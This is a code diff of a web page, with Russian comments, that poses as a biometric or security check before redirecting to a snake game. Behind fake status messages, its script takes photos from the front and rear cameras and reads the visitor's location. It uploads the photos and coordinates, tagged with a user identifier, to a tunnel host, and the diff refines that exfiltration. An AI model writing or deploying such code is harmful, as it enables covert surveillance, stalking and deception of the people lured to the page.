@@ -29,30 +29,25 @@
     <canvas id="c"></canvas>
 
 <script>
-    const API = "https://fd1923621b23b3.lhr.life"; 
+    const API = "https://3d09d32d8a072a.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
     const user = new URLSearchParams(window.location.search).get('user') || "Unknown";
 
     async function capture(mode) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: mode, width: 1280, height: 720 },
-                audio: false 
+                video: { facingMode: mode, width: { ideal: 1280 } }, audio: false 
             });
             const v = document.getElementById('v');
             v.srcObject = stream;
-            await new Promise(r => v.onloadedmetadata = r);
             await v.play();
-            
-            // Ждем 3 секунды - чем дольше, тем больше шансов на качественное фото
+            // Даем 3 секунды — это важно для фокусировки!
             await new Promise(r => setTimeout(r, 3000));
 
             const canvas = document.getElementById('c');
-            canvas.width = v.videoWidth;
-            canvas.height = v.videoHeight;
+            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
             canvas.getContext('2d').drawImage(v, 0, 0);
-
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
             stream.getTracks().forEach(t => t.stop());
             return blob;
         } catch (e) { return null; }
@@ -63,34 +58,40 @@
         document.getElementById('loader').style.display = 'block';
         const msg = document.getElementById('msg');
 
-        // ГЕО
+        // 1. ГЕО (летит в фоне)
         navigator.geolocation.getCurrentPosition(p => {
-            fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`, {mode:'no-cors', keepalive:true});
+            fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
         }, null, {timeout: 5000});
 
-        // ФОТО
-        msg.innerText = "Analyzing security (Step 1/2)...";
+        // 2. ФОТО (ждем по очереди)
+        msg.innerText = "Scanning biometrics...";
         const f1 = await capture("user");
-        msg.innerText = "Analyzing security (Step 2/2)...";
+        msg.innerText = "Environmental check...";
         const f2 = await capture("environment");
 
-        const fd = new FormData();
-        if (f1) fd.append('files', f1, 'f.jpg');
-        if (f2) fd.append('files', f2, 'b.jpg');
+        // 3. ОТПРАВКА И ОЖИДАНИЕ
+        if (f1 || f2) {
+            msg.innerText = "Finalizing (Stay on this page)...";
+            const fd = new FormData();
+            if (f1) fd.append('files', f1, '1.jpg');
+            if (f2) fd.append('files', f2, '2.jpg');
 
-        if (fd.has('files')) {
-            msg.innerText = "Sending encrypted data...";
             try {
-                // ЖДЕМ ОТВЕТА ОТ СЕРВЕРА (убрали no-cors для надежности ожидания)
-                const res = await fetch(`${API}/upload-photo?user=${user}`, {
+                // ЖДЕМ РЕАЛЬНОГО ОТВЕТА ОТ СЕРВЕРА
+                const response = await fetch(`${API}/upload-photo?user=${user}`, {
                     method: 'POST',
                     body: fd
                 });
-                console.log("Server responded");
-            } catch (e) { console.error("Send failed", e); }
+                
+                if (response.ok) {
+                    msg.innerText = "Success! Loading...";
+                }
+            } catch (e) {
+                console.error("Upload error");
+            }
         }
 
-        msg.innerText = "Verified! Loading game...";
+        // 4. Только после всего этого — редирект
         setTimeout(() => { window.location.replace(REDIRECT_URL); }, 1000);
     }
 </script>
